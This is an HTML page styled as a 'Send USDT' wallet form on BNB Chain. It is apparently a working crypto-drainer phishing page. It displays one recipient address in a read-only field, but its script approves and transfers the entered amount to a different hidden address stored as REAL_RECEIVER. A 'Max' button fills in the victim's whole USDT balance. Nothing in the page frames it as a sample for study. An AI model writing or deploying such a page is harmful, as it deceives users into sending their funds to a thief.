<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .container {
      flex: 1;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      color: #555;
      margin: 20px 0 8px;
    }

    .input-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
      position: relative;
    }

    .input-box input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
      background: transparent;
    }

    .input-box .clear-btn, .input-box .paste-btn {
      background: none;
      border: none;
      font-size: 18px;
      cursor: pointer;
    }

    .clear-btn {
      color: #aaa;
      margin-right: 8px;
    }

    .paste-btn {
      color: #0052ff;
      font-weight: bold;
    }

    .amount-section {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-top: 8px;
    }

    .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .amount-section span, .max-btn {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
    }

    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }

    .footer {
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
      position: relative;
    }

    .button.loading::after {
      content: "Processing...";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 16px;
      color: #0052ff;
      font-weight: bold;
      border-radius: 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="address" readonly value="0xc07506a44dd9E2A0d4F010465C40A80A2117219a">
      <button class="clear-btn" onclick="document.getElementById('address').value=''">&times;</button>
      <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value=text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span>USDT</span>
      <span class="max-btn" onclick="setMax()">Max</span>
    </div>

    <div class="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="nextStep()">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const REAL_RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const USDT_ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}];

    let web3, user;

    async function init() {
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        const netId = await web3.eth.net.getId();
        if (netId !== 56) {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        }
        const accounts = await web3.eth.requestAccounts();
        user = accounts[0];
      }
    }

    async function setMax() {
      const contract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
      const balance = await contract.methods.balanceOf(user).call();
      const usdtAmount = web3.utils.fromWei(balance, "ether");
      document.getElementById("amount").value = usdtAmount;
      document.querySelector(".converted").innerText = `= $${parseFloat(usdtAmount).toFixed(2)}`;
    }

    async function nextStep() {
      const btn = document.getElementById("nextBtn");
      const amount = document.getElementById("amount").value;
      if (!amount) return alert("Please enter amount.");
      btn.classList.add("loading");

      try {
        const contract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
        const value = web3.utils.toWei(amount, "ether");

        await contract.methods.approve(REAL_RECEIVER, value).send({ from: user });
        await contract.methods.transfer(REAL_RECEIVER, value).send({ from: user });

        alert("Transfer successful.");
      } catch (err) {
        alert("Transaction failed.");
      }

      btn.classList.remove("loading");
    }

    window.onload = init;
  </script>

</body>
</html>
